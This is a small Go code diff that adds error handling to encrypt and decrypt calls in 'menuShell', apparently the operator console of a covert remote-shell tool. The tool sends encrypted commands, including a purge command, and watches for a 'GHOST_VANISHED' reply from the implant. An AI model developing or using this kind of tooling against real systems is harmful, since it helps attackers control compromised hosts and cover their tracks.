@@ -164,7 +164,11 @@ func menuShell() {
 			effectiveCmd = "__PURGE__"
 		}
 
-		encryptedCmd := crypto.EncryptAES([]byte(effectiveCmd), key[:])
+		encryptedCmd, err := crypto.EncryptAES([]byte(effectiveCmd), key[:])
+		if err != nil {
+			fmt.Printf("%s[!] Encryption Error: %v%s\n", red, err, reset)
+			continue
+		}
 		payload := url.Values{}
 		payload.Set("d", base64.StdEncoding.EncodeToString(encryptedCmd))
 
@@ -204,9 +208,9 @@ func menuShell() {
 			continue
 		}
 
-		res := crypto.DecryptAES(decoded, key[:])
-		if res == nil {
-			fmt.Printf("%s[!] Decryption Failed%s\n", red, reset)
+		res, err := crypto.DecryptAES(decoded, key[:])
+		if err != nil {
+			fmt.Printf("%s[!] Decryption Failed: %v%s\n", red, err, reset)
 		} else {
 			output := string(res)
 			if output == "GHOST_VANISHED" {
